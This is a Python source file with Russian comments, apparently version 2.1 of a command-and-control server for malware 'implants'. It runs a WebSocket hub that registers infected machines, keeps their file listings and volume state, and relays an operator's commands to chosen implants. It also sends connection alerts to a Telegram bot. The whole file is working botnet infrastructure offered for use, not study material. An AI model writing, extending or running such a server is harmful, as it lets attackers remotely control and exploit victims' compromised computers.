#
# --- Файл: c2_server.py (Версия 2.1 - Пуленепробиваемый) ---
#
import asyncio, json, os, threading, urllib.parse, urllib.request
from aiohttp import web
import settings

def send_telegram_message(message):
  """Асинхронно отправляет сообщение в Telegram в отдельном потоке."""
  def send():
    try:
      url = f"https://api.telegram.org/bot{settings.BOT_TOKEN}/sendMessage?chat_id={settings.CHAT_ID}&text={urllib.parse.quote_plus(message)}"
      urllib.request.urlopen(url, timeout=10)
    except Exception as e:
      print(f"[!] Ошибка отправки в Telegram: {e}")
  threading.Thread(target=send, daemon=True).start()

IMPLANTS, OPERATOR = {}, None

async def websocket_handler(request):
  global OPERATOR, IMPLANTS
  ws = web.WebSocketResponse(); await ws.prepare(request)
  client_type, client_id = None, None
  try:
    # Пытаемся получить первое сообщение. Если клиент отвалится тут - это не страшно.
    initial_msg_raw = await ws.receive(timeout=15.0)
    if initial_msg_raw.type != web.WSMsgType.TEXT:
      await ws.close()
      return ws

    initial_msg = json.loads(initial_msg_raw.data)
    client_type = initial_msg.get('type')

    if client_type == 'operator':
      OPERATOR = ws
      print("[+] Оператор подключился.")
      await broadcast_bot_list()
    elif client_type == 'implant':
      client_id = initial_msg.get('id')
      IMPLANTS[client_id] = {
        "ws": ws,
        "files": initial_msg.get('files', {}),
        "volume_state": initial_msg.get('volume_state', {})
      }
      print(f"[+] Новый имплант онлайн: {client_id}")
      send_telegram_message(f"✅ Имплант ОНЛАЙН: {client_id}")
      await broadcast_bot_list()
    else:
      await ws.close()
      return ws

    async for msg in ws:
      if msg.type == web.WSMsgType.TEXT:
        if msg.data == 'ping': 
          await ws.send_str('pong')
          continue

        # <<< ГЛАВНЫЙ ФИКС: КЕВЛАРОВАЯ ПЛАСТИНА >>>
        # Прежде чем доверять сообщению, проверяем, не мусор ли это.
        try:
          data = json.loads(msg.data)
        except json.JSONDecodeError:
          print(f"[!] Получен мусор от {client_id or 'неизвестного'}, игнорирую.")
          continue # Просто переходим к следующему сообщению

        if client_type == 'operator':
          target_id = data.get('target_id')
          command_type = data.get('type')

          # Маршрутизация команд от оператора
          if command_type == 'command' and target_id in IMPLANTS:
            await IMPLANTS[target_id]["ws"].send_json(data['payload'])
          elif command_type == 'get_details' and target_id in IMPLANTS:
            details = {
              "files": IMPLANTS[target_id].get("files"),
              "volume_state": IMPLANTS[target_id].get("volume_state")
            }
            await OPERATOR.send_json({'type': 'bot_details', 'bot_id': target_id, 'data': details})
          elif command_type == 'get_volume_state' and target_id in IMPLANTS:
             await IMPLANTS[target_id]["ws"].send_json(data['payload'])

        elif client_type == 'implant':
          # Маршрутизация сообщений от импланта
          msg_from_implant_type = data.get('type')
          if msg_from_implant_type == 'file_list_update':
            if client_id in IMPLANTS:
              IMPLANTS[client_id]["files"] = data.get('data', {})
          elif msg_from_implant_type == 'volume_update':
             if client_id in IMPLANTS:
              IMPLANTS[client_id]["volume_state"] = data.get('data', {})

          # В любом случае пересылаем всё оператору
          if OPERATOR:
            data['bot_id'] = client_id
            await OPERATOR.send_json(data)

  except asyncio.TimeoutError:
    print("[!] Таймаут получения начального сообщения.")
  except Exception as e:
    print(f"[!] Непредвиденная ошибка в websocket_handler: {e}")
  finally:
    if client_type == 'implant' and client_id in IMPLANTS:
      del IMPLANTS[client_id]
      print(f"[-] Имплант отключился: {client_id}")
      send_telegram_message(f"❌ Имплант ОТКЛЮЧИЛСЯ: {client_id}")
      await broadcast_bot_list()
    elif client_type == 'operator':
      OPERATOR = None
      print("[-] Оператор отключился.")
  return ws

async def broadcast_bot_list():
  if OPERATOR and not OPERATOR.closed:
    try:
      bot_ids = list(IMPLANTS.keys())
      await OPERATOR.send_json({'type': 'bot_list', 'data': bot_ids})
    except ConnectionResetError:
      print("[!] Попытка отправить список отключенному оператору.")

async def http_handler(request):
  return web.FileResponse(os.path.join(os.path.dirname(__file__), 'index.html'))

async def main():
  app = web.Application()
  app.router.add_get('/', http_handler)
  app.router.add_get('/ws', websocket_handler)
  runner = web.AppRunner(app)
  await runner.setup()
  site = web.TCPSite(runner, '0.0.0.0', 10000)
  await site.start()
  print("====== C2 SERVER (V2.1) ONLINE ======")
  send_telegram_message("🚀 Сервер 'Крепость' V2.1 запущен.")
  await asyncio.Event().wait()

if __name__ == "__main__":
  try:
    asyncio.run(main())
  except KeyboardInterrupt:
    print("\nСервер остановлен вручную.")
  finally:
    send_telegram_message("🛑 Сервер 'Крепость' V2.1 остановлен.")
